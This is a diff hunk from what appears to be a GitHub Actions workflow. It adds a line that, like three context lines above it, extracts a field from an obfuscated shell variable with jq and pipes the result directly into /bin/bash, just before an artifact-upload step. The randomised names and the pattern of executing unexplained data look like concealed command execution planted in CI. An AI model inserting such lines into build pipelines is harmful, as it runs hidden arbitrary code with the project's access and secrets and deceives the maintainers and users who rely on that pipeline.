@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$szi00" | jq -r .utef70 | /bin/bash
           printf '%s' "$upooj89815" | jq -r .ed6 | /bin/bash
           echo $uz2 | jq -r .fskai0 | /bin/bash
+          printf '%s' "$iluz27" | jq -r .a5 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
